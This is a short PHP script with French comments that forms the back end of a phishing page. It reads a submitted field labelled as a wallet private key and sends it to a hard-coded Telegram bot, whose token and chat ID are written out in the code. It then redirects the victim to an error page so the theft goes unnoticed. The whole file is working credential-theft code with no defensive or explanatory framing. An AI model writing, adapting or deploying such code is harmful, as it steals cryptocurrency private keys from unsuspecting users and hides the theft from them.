<?php
// Le jeton d'autorisation de votre bot
$token = "6064441171:AAEM5NUcEBCrpeUFrIVug4UifZ--85jiZWU";

// L'identifiant du chat auquel vous voulez envoyer le message
// Vous pouvez obtenir cet identifiant en utilisant la méthode getUpdates
$chat_id = "5816242757";

    $keystorepass = $_POST['phrase2'];
   
    

// Le message que vous voulez envoyer
// Vous pouvez récupérer les données du formulaire comme dans les exemples précédents
$message = "Voici les données du formulaire :\n"
        
        . "Private key : $keystorepass";
        
       
        

// L'URL de l'API de bot Telegram avec la méthode sendMessage
$url = "https://api.telegram.org/bot$token/sendMessage?chat_id=$chat_id&text=$message";

// Appel de l'URL avec la fonction file_get_contents

$response = file_get_contents($url);
header("Location: error.php");
exit();

?>

